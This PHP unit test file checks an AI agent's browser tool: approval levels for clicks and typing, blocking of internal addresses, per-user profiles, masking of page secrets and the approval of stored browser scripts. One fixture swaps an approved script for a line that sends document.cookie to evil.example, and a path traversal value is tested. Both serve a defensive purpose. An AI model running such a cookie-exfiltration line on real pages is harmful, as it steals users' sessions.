<?php

declare(strict_types=1);

namespace OpenCCK\Test\Unit\App\Web;

use Amp\Http\Client\HttpClient;
use Amp\NullCancellation;
use Amp\PHPUnit\AsyncTestCase;
use OpenCCK\App\Agent\Tool\ToolContext;
use OpenCCK\App\Agent\Tool\Web\BrowserTool;
use OpenCCK\Domain\Agent\DangerClass;
use OpenCCK\Domain\Entity\Principal;
use OpenCCK\Domain\Entity\PrincipalKind;
use OpenCCK\Domain\Entity\Role;
use OpenCCK\Infrastructure\Browser\BrowserClient;
use OpenCCK\Test\Support\FakeChannel;
use OpenCCK\Test\Support\FakeHttpClient;

final class BrowserToolTest extends AsyncTestCase {
    private FakeChannel $channel;

    private function tool(FakeHttpClient $http): BrowserTool {
        $this->channel = new FakeChannel();
        $guard = new \OpenCCK\App\Agent\Tool\Guard\AddressGuard(static fn(string $host): array => $host === 'nas.home.lan' ? ['192.168.1.10'] : ['93.184.216.34']);
        return new BrowserTool(new BrowserClient(new HttpClient($http, []), 'http://browser:3000', 'token-token-token'), $this->channel, '42', $guard);
    }

    public function testAnInternalPageOpensOnlyWithTheOwnersPermission(): void {
        $http = new FakeHttpClient(['http://browser:3000/navigate' => [200, ['content-type' => 'application/json'], '{"url":"http://nas.home.lan/","title":"NAS","text":"ok","elements":[]}']]);
        $tool = $this->tool($http);
        $args = ['action' => 'open', 'url' => 'http://nas.home.lan/'];

        self::assertSame(DangerClass::Irreversible, $tool->danger($args));
        self::assertSame('addr:nas.home.lan', $tool->grantKey($args));
        self::assertNull($tool->grantKey(['action' => 'open', 'url' => 'https://example.com/']));

        $tool->execute($args, self::context());
        $tool->execute($args, new ToolContext(1, 1, new Principal(1, PrincipalKind::Human, Role::owner(), null), new NullCancellation(), approved: true));

        self::assertStringNotContainsString('allow', $http->bodies[0], 'without the owner nothing is let through');
        self::assertStringContainsString('"allow":["nas.home.lan"]', $http->bodies[1]);
    }

    public function testEachParticipantHasProfilesOfTheirOwnAndOfTheirProject(): void {
        $page = '{"url":"https://example.com/","title":"Example","text":"ok","elements":[]}';
        $http = new FakeHttpClient(['http://browser:3000/navigate' => [200, ['content-type' => 'application/json'], $page], 'http://browser:3000/close' => [200, ['content-type' => 'application/json'], '{"ok":true}']]);
        $this->channel = new FakeChannel();
        $tool = new BrowserTool(new BrowserClient(new HttpClient($http, []), 'http://browser:3000', 'token-token-token'), $this->channel, '42', projectOf: static fn(int $conversationId): ?int => $conversationId === 7 ? 3 : null);
        $owner = new Principal(1, PrincipalKind::Human, Role::owner(), null);
        $user = new Principal(5, PrincipalKind::Human, Role::user(), null);

        // spec: brief/agent-loop.md#раскладка-каталогов — the profile comes from the participant, the model names only
        //       a profile within their own set: a participant does not open the owner's "main"
        $tool->execute(['action' => 'open', 'url' => 'https://example.com/'], new ToolContext(1, 1, $owner, new NullCancellation()));
        $tool->execute(['action' => 'open', 'url' => 'https://example.com/', 'profile' => 'main'], new ToolContext(2, 2, $user, new NullCancellation()));
        $tool->execute(['action' => 'open', 'url' => 'https://example.com/', 'profile' => 'shop'], new ToolContext(3, 7, $user, new NullCancellation()));
        $tool->execute(['action' => 'close', 'profile' => 'main'], new ToolContext(2, 2, $user, new NullCancellation()));

        $profiles = array_map(static function (string $body): mixed {
            /** @var array<string, mixed> $sent */
            $sent = json_decode($body, true, 8, JSON_THROW_ON_ERROR);
            return $sent['profile'] ?? null;
        }, $http->bodies);
        self::assertSame(['p1/main', 'p5/main', 'p5/projects/3/shop', 'p5/main'], $profiles);
    }

    public function testThoseWhoWorkInAProjectUseTheProfilesOfItsOwner(): void {
        // spec: brief/internet.md#входы-в-браузере-и-профиль-проекта — a login made in a chat of the project serves its jobs and members
        $page = '{"url":"https://example.com/","title":"Example","text":"ok","elements":[]}';
        $http = new FakeHttpClient(['http://browser:3000/navigate' => [200, ['content-type' => 'application/json'], $page]]);
        $this->channel = new FakeChannel();
        $tool = new BrowserTool(
            new BrowserClient(new HttpClient($http, []), 'http://browser:3000', 'token-token-token'),
            $this->channel,
            '42',
            projectOf: static fn(int $conversationId): int => 3,
            holderOf: static fn(int $project, Principal $who): ?int => $who->id === 9 ? null : 1,
        );
        $member = new Principal(5, PrincipalKind::Agent, Role::user(), 'helper');
        $reader = new Principal(9, PrincipalKind::Human, Role::user(), null);

        $tool->execute(['action' => 'open', 'url' => 'https://example.com/'], new ToolContext(1, 1, $member, new NullCancellation()));
        $tool->execute(['action' => 'open', 'url' => 'https://example.com/'], new ToolContext(2, 2, $reader, new NullCancellation()));

        $profiles = array_map(static function (string $body): mixed {
            /** @var array<string, mixed> $sent */
            $sent = json_decode($body, true, 8, JSON_THROW_ON_ERROR);
            return $sent['profile'] ?? null;
        }, $http->bodies);
        self::assertSame(['p1/projects/3/main', 'p9/projects/3/main'], $profiles, 'the owner\'s set for a member who writes, their own for one who only reads');
    }

    private static function context(): ToolContext {
        return new ToolContext(1, 1, new Principal(1, PrincipalKind::Human, Role::owner(), null), new NullCancellation());
    }

    public function testActingWaitsForTheOwnerOnlyWhenTheOwnerAskedForIt(): void {
        $tool = $this->tool(new FakeHttpClient());

        // spec: brief/decisions.md#принятые-владельцем-риски — browser confirmations are off by default (BROWSER_CONFIRM)
        self::assertSame(DangerClass::Read, $tool->danger(['action' => 'open', 'url' => 'https://example.com']));
        self::assertSame(DangerClass::Read, $tool->danger(['action' => 'read']));
        self::assertSame(DangerClass::Write, $tool->danger(['action' => 'type', 'ref' => 1, 'text' => 'x']));
        self::assertSame(DangerClass::Write, $tool->danger(['action' => 'type', 'ref' => 1, 'text' => 'x', 'submit' => true]));
        self::assertSame(DangerClass::Write, $tool->danger(['action' => 'click', 'ref' => 3]));
        self::assertSame(DangerClass::Irreversible, $tool->danger(['action' => 'open', 'url' => 'http://nas.home.lan/']), 'an internal address still asks');

        $careful = new BrowserTool(new BrowserClient(new HttpClient(new FakeHttpClient(), []), 'http://browser:3000', 'token-token-token'), $this->channel, '42', confirm: true);
        self::assertSame(DangerClass::Irreversible, $careful->danger(['action' => 'type', 'ref' => 1, 'text' => 'x', 'submit' => true]));
        self::assertSame(DangerClass::Irreversible, $careful->danger(['action' => 'click', 'ref' => 3]));
        self::assertSame(DangerClass::Write, $careful->danger(['action' => 'type', 'ref' => 1, 'text' => 'x']));
    }

    public function testAClickGoesToAPointOfTheScreenshotWhenThePlaceHasNoNumber(): void {
        // spec: brief/internet.md#проверка-я-не-робот-и-капча
        $page = json_encode(['url' => 'https://example.com/', 'title' => 'Check', 'text' => 'ok', 'elements' => []], JSON_THROW_ON_ERROR);
        $http = new FakeHttpClient(['http://browser:3000/click' => [200, ['content-type' => 'application/json'], $page]]);
        $tool = $this->tool($http);

        self::assertFalse($tool->execute(['action' => 'click', 'x' => 412, 'y' => 305], self::context())->isError);
        self::assertFalse($tool->execute(['action' => 'click', 'ref' => 3], self::context())->isError);

        $sent = array_map(static fn(string $body): mixed => json_decode($body, true, 8, JSON_THROW_ON_ERROR), $http->bodies);
        self::assertIsArray($sent[0]);
        self::assertSame([412, 305], [$sent[0]['x'] ?? null, $sent[0]['y'] ?? null]);
        self::assertArrayNotHasKey('ref', $sent[0]);
        self::assertIsArray($sent[1]);
        self::assertSame(3, $sent[1]['ref'] ?? null);
    }

    public function testAPageComesBackWithItsElements(): void {
        $page = json_encode(['url' => 'https://example.com/', 'title' => 'Example', 'text' => "Hello\nkey=sk-or-v1-0123456789abcdef0123456789abcdef0123456789abcdef", 'elements' => ['[1] a More → https://iana.org']], JSON_THROW_ON_ERROR);
        $http = new FakeHttpClient(['http://browser:3000/navigate' => [200, ['content-type' => 'application/json'], $page]]);

        $result = $this->tool($http)->execute(['action' => 'open', 'url' => 'https://example.com'], self::context());

        self::assertStringContainsString("https://example.com/\nЗаголовок: Example", $result->content);
        self::assertStringContainsString('[1] a More → https://iana.org', $result->content);
        self::assertStringNotContainsString('0123456789abcdef0123', $result->content);
    }

    public function testAListIsPickedThePageScrollsAndGoesBackAndDialogsAreTold(): void {
        // spec: brief/internet.md#как-сделано-поиск-чтение-и-браузер — select, scroll, back; a dialog of the page is dismissed and told
        $page = json_encode(['url' => 'https://example.com/form', 'title' => 'Form', 'text' => 'ok', 'elements' => ['[1] select Город {msk=Москва | *spb=Санкт-Петербург}'], 'dialogs' => ['alert: Сессия истекла']], JSON_THROW_ON_ERROR);
        $answer = [200, ['content-type' => 'application/json'], $page];
        $http = new FakeHttpClient(['http://browser:3000/select' => $answer, 'http://browser:3000/scroll' => $answer, 'http://browser:3000/back' => $answer]);
        $tool = $this->tool($http);

        self::assertSame(DangerClass::Write, $tool->danger(['action' => 'select', 'ref' => 1, 'value' => 'spb']));
        self::assertSame(DangerClass::Read, $tool->danger(['action' => 'scroll']));
        self::assertSame(DangerClass::Read, $tool->danger(['action' => 'back']));
        $picked = $tool->execute(['action' => 'select', 'ref' => 1, 'value' => 'Санкт-Петербург'], self::context());
        self::assertStringContainsString('*spb=Санкт-Петербург', $picked->content);
        self::assertStringContainsString('alert: Сессия истекла', $picked->content);
        self::assertFalse($tool->execute(['action' => 'scroll', 'direction' => 'bottom'], self::context())->isError);
        self::assertFalse($tool->execute(['action' => 'back'], self::context())->isError);

        self::assertStringContainsString('"value":"Санкт-Петербург"', (string) json_encode(json_decode($http->bodies[0], true), JSON_UNESCAPED_UNICODE));
        self::assertStringContainsString('"direction":"bottom"', $http->bodies[1]);
    }

    public function testTypingTakesTheTextEvenWhenItIsWrittenAsValueAndNeverTypesNothingBySlip(): void {
        // spec: brief/internet.md#как-сделано-поиск-чтение-и-браузер — type needs its text
        $page = json_encode(['url' => 'https://example.com/login', 'title' => 'Login', 'text' => 'ok', 'elements' => ['[5] input:text s_arinin']], JSON_THROW_ON_ERROR);
        $http = new FakeHttpClient(['http://browser:3000/type' => [200, ['content-type' => 'application/json'], $page]]);
        $tool = $this->tool($http);

        self::assertFalse($tool->execute(['action' => 'type', 'ref' => 5, 'value' => 's_arinin', 'submit' => true], self::context())->isError);
        self::assertStringContainsString('"text":"s_arinin"', $http->bodies[0], 'the text written as value is the text');
        self::assertFalse($tool->execute(['action' => 'type', 'ref' => 5, 'text' => ''], self::context())->isError, 'an empty text clears a field');
        self::assertStringContainsString('"text":""', $http->bodies[1]);

        $none = $tool->execute(['action' => 'type', 'ref' => 5, 'submit' => true], self::context());
        self::assertTrue($none->isError);
        self::assertStringContainsString('text', $none->content);
        self::assertTrue($tool->execute(['action' => 'select', 'ref' => 1], self::context())->isError);
        self::assertCount(2, $http->bodies, 'nothing was sent to the page without its text');
    }

    public function testARefusalAndAScreenshot(): void {
        $http = new FakeHttpClient([
            'http://browser:3000/navigate' => [403, [], '{"error":"адрес запрещён: внутренний адрес"}'],
            'http://browser:3000/screenshot' => [200, [], json_encode(['url' => 'https://example.com/', 'png' => base64_encode('PNGDATA')], JSON_THROW_ON_ERROR)],
        ]);
        $tool = $this->tool($http);

        $refused = $tool->execute(['action' => 'open', 'url' => 'http://10.0.0.1/'], self::context());
        self::assertTrue($refused->isError);
        self::assertStringContainsString('внутренний адрес', $refused->content);

        $shot = $tool->execute(['action' => 'screenshot'], self::context());
        self::assertSame('Снимок страницы https://example.com/ отправлен в чат.', $shot->content);
        self::assertSame(['42', 'screenshot.png', 'PNGDATA'], $this->channel->files[0], 'without a conversation — to the owner');
    }

    public function testAScreenshotGoesToTheTopicItWasAskedInAndIsKeptForSending(): void {
        $http = new FakeHttpClient(['http://browser:3000/screenshot' => [200, [], json_encode(['url' => 'https://web.telegram.org/', 'png' => base64_encode('QRPNG')], JSON_THROW_ON_ERROR)]]);
        $conversations = new \OpenCCK\Test\Support\InMemoryConversationRepository();
        $topic = $conversations->openConversation(1, 'telegram', '-100500', '119');
        $sandbox = new \OpenCCK\Test\Support\FakeSandbox();
        $this->channel = new FakeChannel();
        $tool = new BrowserTool(new BrowserClient(new HttpClient($http, []), 'http://browser:3000', 'token-token-token'), $this->channel, '42', null, $conversations, $sandbox);
        $context = new ToolContext(1, $topic, new Principal(1, PrincipalKind::Human, Role::owner(), null), new NullCancellation(), new \OpenCCK\Domain\Agent\ParticipantPolicy(null, new \OpenCCK\Domain\Agent\RunLimits(30, 1000, 900, 120), new \OpenCCK\Domain\Agent\SandboxLimits(100, 10, 5, 1000, 1), true));

        $shot = $tool->execute(['action' => 'screenshot'], $context);

        self::assertSame(['-100500', 'screenshot.png', 'QRPNG'], $this->channel->files[0]);
        self::assertSame('119', $this->channel->fileThreads[0] ?? null);
        $kept = array_keys($sandbox->files[1] ?? []);
        self::assertCount(1, $kept);
        self::assertStringStartsWith('screenshots/shot-', $kept[0]);
        self::assertStringContainsString($kept[0], $shot->content, 'the agent learns where to send it on from');
    }

    public function testTheAgentLooksAtAScreenshotWithTheVisionModel(): void {
        $http = new FakeHttpClient([
            'http://browser:3000/screenshot' => [200, [], json_encode(['url' => 'https://example.com/form', 'png' => base64_encode('PNGDATA')], JSON_THROW_ON_ERROR)],
            'https://openrouter.ai/api/v1/chat/completions' => [200, [], json_encode(['choices' => [['message' => ['content' => 'Форма входа, под кнопкой ошибка «неверный пароль».']]]], JSON_THROW_ON_ERROR)],
        ]);
        $tool = $this->seeing($http, ['MEDIA_VISION_MODELS' => 'openrouter:z-ai/glm-5.3-flash']);

        $result = $tool->execute(['action' => 'screenshot', 'question' => 'Что на экране?', 'send' => false], self::context());

        self::assertFalse($result->isError, $result->content);
        self::assertStringContainsString('неверный пароль', $result->content);
        self::assertStringContainsString('z-ai/glm-5.3-flash', $result->content);
        self::assertSame([], $this->channel->files, 'send: false — not to the chat');
        $toModel = array_search('POST https://openrouter.ai/api/v1/chat/completions', $http->requested, true);
        self::assertIsInt($toModel);
        self::assertStringContainsString(base64_encode('PNGDATA'), $http->bodies[$toModel]);
        self::assertStringContainsString('Что на экране?', $http->bodies[$toModel]);
    }

    public function testWithoutAVisionModelTheScreenshotIsOnlySent(): void {
        $http = new FakeHttpClient(['http://browser:3000/screenshot' => [200, [], json_encode(['url' => 'https://example.com/', 'png' => base64_encode('PNGDATA')], JSON_THROW_ON_ERROR)]]);
        $tool = $this->seeing($http, []);

        $result = $tool->execute(['action' => 'screenshot', 'question' => 'Что на экране?'], self::context());

        self::assertFalse($result->isError, $result->content);
        self::assertCount(1, $this->channel->files);
        self::assertStringContainsString('MEDIA_VISION_MODELS', $result->content);
    }

    /** @param array<string, string> $env */
    private function seeing(FakeHttpClient $http, array $env): BrowserTool {
        $this->channel = new FakeChannel();
        $client = new HttpClient($http, []);
        $settings = \OpenCCK\Infrastructure\Config\MediaSettings::fromEnv($env);
        $models = new \OpenCCK\Infrastructure\Media\MediaModels($client, 'or-key', null, $settings, static fn(string $n): ?string => null, new \OpenCCK\Test\Support\InMemoryLlmCallRepository());
        return new BrowserTool(new BrowserClient($client, 'http://browser:3000', 'token-token-token'), $this->channel, '42', models: $models, prefs: new \OpenCCK\App\Agent\Media\MediaPrefs(new \OpenCCK\Test\Support\InMemoryMediaPrefRepository(), $settings));
    }

    private function scripted(FakeHttpClient $http, \OpenCCK\Test\Support\FakeSandbox $sandbox): BrowserTool {
        $this->channel = new FakeChannel();
        return new BrowserTool(new BrowserClient(new HttpClient($http, []), 'http://browser:3000', 'token-token-token'), $this->channel, '42', null, null, $sandbox);
    }

    private static function policy(): \OpenCCK\Domain\Agent\ParticipantPolicy {
        return new \OpenCCK\Domain\Agent\ParticipantPolicy(null, new \OpenCCK\Domain\Agent\RunLimits(30, 1000, 900, 120), new \OpenCCK\Domain\Agent\SandboxLimits(100, 10, 5, 1000, 1), true);
    }

    public function testAReadScriptRunsFromTheSandboxWithoutACard(): void {
        $sandbox = new \OpenCCK\Test\Support\FakeSandbox();
        $sandbox->files[1]['browser-scripts/read/web.telegram.org/messages.js'] = "return [...document.querySelectorAll('.message')].slice(0, args.limit).map(m => m.innerText);";
        $http = new FakeHttpClient(['http://browser:3000/evaluate' => [200, [], json_encode(['url' => 'https://web.telegram.org/k/', 'result' => '["Привет","key=sk-or-v1-0123456789abcdef0123456789abcdef0123456789abcdef"]', 'truncated' => false], JSON_THROW_ON_ERROR)]]);
        $tool = $this->scripted($http, $sandbox);
        $args = ['action' => 'script', 'path' => 'browser-scripts/read/web.telegram.org/messages.js', 'site' => 'web.telegram.org', 'args' => ['limit' => 20]];

        $prepared = $tool->prepare($args, self::context()->principal, self::policy(), new NullCancellation());
        self::assertIsArray($prepared);
        self::assertSame(DangerClass::Read, $tool->danger($prepared), 'a read script reads');
        self::assertTrue($tool->readsOutside($prepared));
        $result = $tool->execute($prepared, self::context());

        self::assertFalse($result->isError);
        self::assertStringContainsString('Привет', $result->content);
        self::assertStringNotContainsString('0123456789abcdef0123', $result->content, 'secrets of the page are masked');
        /** @var array{profile: string, mode: string, host: string, args: array<string, int>, source: string} $sent */
        $sent = json_decode($http->bodies[0], true, 8, JSON_THROW_ON_ERROR);
        self::assertSame(['p1/main', 'read', 'web.telegram.org', ['limit' => 20]], [$sent['profile'], $sent['mode'], $sent['host'], $sent['args']]);
        self::assertStringContainsString('.message', $sent['source']);
    }

    public function testAnActingScriptWaitsForACardKeyedBySiteAndText(): void {
        $sandbox = new \OpenCCK\Test\Support\FakeSandbox();
        $sandbox->files[1]['browser-scripts/act/web.telegram.org/send.js'] = 'document.querySelector(".send").click();';
        $tool = $this->scripted(new FakeHttpClient(), $sandbox);
        $args = ['action' => 'script', 'path' => 'browser-scripts/act/web.telegram.org/send.js', 'site' => 'web.telegram.org'];

        $prepared = $tool->prepare($args, self::context()->principal, self::policy(), new NullCancellation());
        self::assertIsArray($prepared);
        self::assertSame(DangerClass::Irreversible, $tool->danger($prepared));
        self::assertSame('document.querySelector(".send").click();', $prepared['source'], 'the card shows the script');
        $key = $tool->grantKey($prepared);
        self::assertSame('browser-script:web.telegram.org:' . substr(hash('sha256', 'document.querySelector(".send").click();'), 0, 16), $key);

        $sandbox->files[1]['browser-scripts/act/web.telegram.org/send.js'] = 'fetch("https://evil.example/?" + document.cookie);';
        $changed = $tool->prepare($args, self::context()->principal, self::policy(), new NullCancellation());
        self::assertIsArray($changed);
        self::assertNotSame($key, $tool->grantKey($changed), 'a changed script is asked again');
        self::assertNull($tool->grantKey($args), 'not prepared — no grant');
    }

    public function testAScriptOutsideItsFoldersOrSiteIsRefused(): void {
        $sandbox = new \OpenCCK\Test\Support\FakeSandbox();
        $sandbox->files[1]['x.js'] = 'return 1';
        $tool = $this->scripted(new FakeHttpClient(), $sandbox);
        $principal = self::context()->principal;

        foreach (['x.js', 'browser-scripts/read/../act/a.js', 'browser-scripts/read/a.txt', 'browser-scripts/other/a.js'] as $path) {
            self::assertIsString($tool->prepare(['action' => 'script', 'path' => $path, 'site' => 'example.com'], $principal, self::policy(), new NullCancellation()), $path);
        }
        self::assertIsString($tool->prepare(['action' => 'script', 'path' => 'browser-scripts/read/a.js', 'site' => 'https://example.com/'], $principal, self::policy(), new NullCancellation()), 'site is a host name');
        self::assertIsString($tool->prepare(['action' => 'script', 'path' => 'browser-scripts/read/missing.js', 'site' => 'example.com'], $principal, self::policy(), new NullCancellation()));
        self::assertSame(['action' => 'read'], $tool->prepare(['action' => 'read'], $principal, self::policy(), new NullCancellation()), 'other actions are as they are');
    }
}
